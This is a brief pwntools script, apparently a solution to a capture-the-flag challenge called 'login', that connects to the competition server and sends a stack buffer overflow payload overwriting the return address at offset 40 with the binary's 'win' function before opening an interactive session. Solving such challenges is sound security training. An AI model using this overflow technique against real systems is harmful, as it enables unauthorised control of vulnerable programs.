from pwn import *

CHAL = "login"

exe = ELF("./login")
p = remote("tamuctf.com", 443, ssl=True, sni=CHAL)

payload = flat({
    40: exe.symbols['win'],
})
p.sendline(payload)
p.sendline(b"")

p.interactive()
